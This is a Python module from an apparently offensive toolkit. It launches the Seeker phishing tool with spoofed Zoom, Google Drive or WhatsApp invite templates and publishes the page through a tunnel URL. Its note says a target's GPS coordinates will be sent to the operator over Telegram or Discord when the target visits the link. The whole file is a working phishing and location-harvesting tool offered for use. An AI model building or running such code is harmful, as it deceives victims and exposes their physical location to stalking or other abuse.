import subprocess
import os
from pathlib import Path
from ..utils import load_config, save_result, timestamp
from ..tunnel.manager import get_public_url

cfg = load_config()
SEEKER_DIR = cfg["tool_paths"]["seeker"]

TEMPLATES = ["zoom", "google_drive", "whatsapp", "whatsapp_group_invite"]


def run(template: str = "zoom", telegram_token: str = "", telegram_chat: str = "",
        discord_webhook: str = "", dry_run: bool = False) -> dict:
    script = str(Path(SEEKER_DIR) / "seeker.py")

    notify = cfg.get("notify", {})
    tok = telegram_token or notify.get("telegram_token", "")
    chat = telegram_chat or notify.get("telegram_chat_id", "")
    webhook = discord_webhook or notify.get("discord_webhook", "")

    if dry_run:
        data = {
            "module": "phishing.location",
            "template": template,
            "dry_run": True,
            "timestamp": timestamp(),
            "status": "dry_run_ok",
            "script": script,
            "available_templates": TEMPLATES,
        }
        save_result("phishing_location", data)
        return data

    cmd = ["python3", script, "-t", template]
    if tok and chat:
        cmd += ["--telegram-token", tok, "--telegram-chatid", chat]

    proc = subprocess.Popen(cmd, cwd=SEEKER_DIR, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    public_url = get_public_url()

    data = {
        "module": "phishing.location",
        "template": template,
        "timestamp": timestamp(),
        "public_url": public_url,
        "pid": proc.pid,
        "note": "GPS coordinates will arrive via Telegram/Discord when target visits link",
    }
    save_result("phishing_location", data)
    return data
